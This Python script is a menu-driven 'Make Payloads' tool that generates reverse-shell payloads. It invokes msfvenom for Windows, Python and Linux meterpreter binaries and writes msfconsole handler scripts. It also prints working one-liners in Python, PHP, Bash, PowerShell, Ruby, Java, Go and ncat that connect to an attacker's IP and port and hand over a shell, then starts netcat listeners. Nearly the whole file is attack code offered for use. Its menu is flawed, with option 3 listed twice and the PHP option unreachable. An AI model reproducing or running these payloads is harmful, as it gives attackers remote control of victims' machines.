import os
import subprocess
import pyfiglet
import time
os.system("clear")
ascii_banner = pyfiglet.figlet_format("Make Payloads")
print(ascii_banner)


def Windows_Reverse_Shell():
    os.system("clear")
    ascii_banner = pyfiglet.figlet_format("Make Payloads")
    print(ascii_banner)
    print("\n\n")
    ipaddr = input("[-] Enter Your Ip : ")
    port = input("[+] Enter Your Port : ")
    subprocess.call(
        f"""msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST={ipaddr} LPORT={port} -f exe -o payload.exe""", shell=True)
    x = input("""
We Make Payload Sucss 

Do You Want To Start Listener? y/n : """)
    if x == "y":
        try:
            os.remove("msf.rc")
        except:
            pass
        subprocess.call("touch msf.rc", shell=True)
        file = open("msf.rc", "a")
        file.write(f"""
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST {ipaddr}
set LPORT {port}
exploit -j
        """)
        file.close()
        # time.sleep(2)
        subprocess.call("msfconsole -r msf.rc", shell=True)
    else:
        main()


def Python_Reverse_Shell_msf():
    os.system("clear")
    ascii_banner = pyfiglet.figlet_format("Make Payloads")
    print(ascii_banner)
    print("\n\n")
    ipaddr = input("[-] Enter Your Ip : ")
    port = input("[+] Enter Your Port : ")
    subprocess.call(
        f"""msfvenom -p python/meterpreter/reverse_tcp  LHOST={ipaddr} LPORT={port} -f py -o payload.py""", shell=True)
    x = input("""
We Make Payload Sucss 

Do You Want To Start Listener? y/n : """)
    if x == "y":
        try:
            os.remove("msf.rc")
        except:
            pass
        subprocess.call("touch msf.rc", shell=True)
        file = open("msf.rc", "a")
        file.write(f"""
use exploit/multi/handler
set payload python/meterpreter/reverse_tcp
set LHOST {ipaddr}
set LPORT {port}
exploit -j
        """)
        file.close()
        # time.sleep(2)
        subprocess.call("msfconsole -r msf.rc", shell=True)
    else:
        main()


def Python3_Reverse_Shell():
    os.system("clear")
    ascii_banner = pyfiglet.figlet_format("Make Payloads")
    print(ascii_banner)
    print("\n\n")
    ipaddr = input("[-] Enter Your Ip : ")
    port = input("[+] Enter Your Port : ")
    print(f"""
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ipaddr}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
    """)

    x = input("[+] Do You Want To Start Listener ? y/n : ")

    if x == "y":
        subprocess.call(f"nc -lvnp {port}", shell=True)

    else:
        main()


def php_reverse_shell():
    os.system("clear")
    ascii_banner = pyfiglet.figlet_format("Make Payloads")
    print(ascii_banner)
    print("\n\n")
    ipaddr = input("[-] Enter Your Ip : ")
    port = input("[+] Enter Your Port : ")
    print(f"""
php -r '$sock=fsockopen("{ipaddr}",{port});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
    """)

    x = input("[+] Do You Want To Start Listener ? y/n : ")

    if x == "y":
        subprocess.call(f"nc -lvnp {port}", shell=True)

    else:
        main()


def bash_reverse_shell():
    os.system("clear")
    ascii_banner = pyfiglet.figlet_format("Make Payloads")
    print(ascii_banner)
    print("\n\n")
    ipaddr = input("[-] Enter Your Ip : ")
    port = input("[+] Enter Your Port : ")
    print(f"""
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ipaddr} {port} >/tmp/f
    """)

    x = input("[+] Do You Want To Start Listener ? y/n : ")

    if x == "y":
        subprocess.call(f"nc -lvnp {port}", shell=True)

    else:
        main()


def powershell_reverse_shell():
    os.system("clear")
    ascii_banner = pyfiglet.figlet_format("Make Payloads")
    print(ascii_banner)
    print("\n\n")
    ipaddr = input("[-] Enter Your Ip : ")
    port = input("[+] Enter Your Port : ")
    print('powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient("' + ipaddr+'",' + port +
          ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"')

    x = input("[+] Do You Want To Start Listener ? y/n : ")

    if x == "y":
        subprocess.call(f"nc -lvnp {port}", shell=True)

    else:
        main()


def rubby_reverse_shell():
    os.system("clear")
    ascii_banner = pyfiglet.figlet_format("Make Payloads")
    print(ascii_banner)
    print("\n\n")
    ipaddr = input("[-] Enter Your Ip : ")
    port = input("[+] Enter Your Port : ")
    print(f"""
    ruby -rsocket -e'f=TCPSocket.open("{ipaddr}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
    """)
    x = input("[+] Do You Want To Start Listener ? y/n : ")

    if x == "y":
        subprocess.call(f"nc -lvnp {port}", shell=True)

    else:
        main()


def java_reverse_shell():
    os.system("clear")
    ascii_banner = pyfiglet.figlet_format("Make Payloads")
    print(ascii_banner)
    print("\n\n")
    ipaddr = input("[-] Enter Your Ip : ")
    port = input("[+] Enter Your Port : ")
    print(f"""
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/{ipaddr}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'");
    """)
    x = input("[+] Do You Want To Start Listener ? y/n : ")

    if x == "y":
        subprocess.call(f"nc -lvnp {port}", shell=True)

    else:
        main()


def golang_reverse_shell():
    os.system("clear")
    ascii_banner = pyfiglet.figlet_format("Make Payloads")
    print(ascii_banner)
    print("\n\n")
    ipaddr = input("[-] Enter Your Ip : ")
    port = input("[+] Enter Your Port : ")
    print('echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","' + ipaddr + ':' + port +
          '");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go')
    x = input("[+] Do You Want To Start Listener ? y/n : ")

    if x == "y":
        subprocess.call(f"nc -lvnp {port}", shell=True)

    else:
        main()


def ncat_reverse_shell():
    os.system("clear")
    ascii_banner = pyfiglet.figlet_format("Make Payloads")
    print(ascii_banner)
    print("\n\n")
    ipaddr = input("[-] Enter Your Ip : ")
    port = input("[+] Enter Your Port : ")
    print(f"""
For Linux :
    ncat {ipaddr} {port} -e /bin/bash

For Windows:
    ncat {ipaddr} {port} -e cmd.exe
    """)
    x = input("[+] Do You Want To Start Listener ? y/n : ")

    if x == "y":
        subprocess.call(f"nc -lvnp {port}", shell=True)

    else:
        main()


def linux_reverse_tcp():
    os.system("clear")
    ascii_banner = pyfiglet.figlet_format("Make Payloads")
    print(ascii_banner)
    print("\n\n")
    ipaddr = input("[-] Enter Your Ip : ")
    port = input("[+] Enter Your Port : ")
    subprocess.call(
        f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ipaddr} LPORT={port} -f elf > payload.elf", shell=True)
    x = input("""
We Make Payload Sucss 

Do You Want To Start Listener? y/n : """)
    if x == "y":
        os.remove("msf.rc")
        file = open("msf.rc", "a")
        file.write(f"""
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST {ipaddr}
set LPORT {port}
exploit -j
        """)
        file.close()
        subprocess.call("msfconsole -r msf.rc", shell=True)
    else:
        main()


def main():
    os.system("clear")
    payload_num = int(input("""

[1] Windows Reverse Shell Payload x64 (metasploit)
[2] Python Payload (metasploit)
[3] Python3 Reverse Shell
[3] PHP Reverse Shell 
[4] Bash Reverse Shell
[5] Powershell Reverse Shell
[6] Ruby Reverse Shell
[7] Java Reverse Shell
[8] Golang Reverse Shell
[9] Ncat Reverse Shell
[10] Linux Stageless reverse TCP (metasploit)

[00] EXIT

[+] Chose Numper : """))

    if payload_num == 1:
        Windows_Reverse_Shell()
    elif payload_num == 2:
        Python_Reverse_Shell_msf()
    elif payload_num == 3:
        Python3_Reverse_Shell()
    elif payload_num == 4:
        bash_reverse_shell()
    elif payload_num == 5:
        powershell_reverse_shell()
    elif payload_num == 6:
        rubby_reverse_shell()
    elif payload_num == 7:
        java_reverse_shell()
    elif payload_num == 8:
        golang_reverse_shell()
    elif payload_num == 9:
        ncat_reverse_shell()
    elif payload_num == 10:
        linux_reverse_tcp()
    elif payload_num == 00:
        exit()
    else:
        return main()


main()
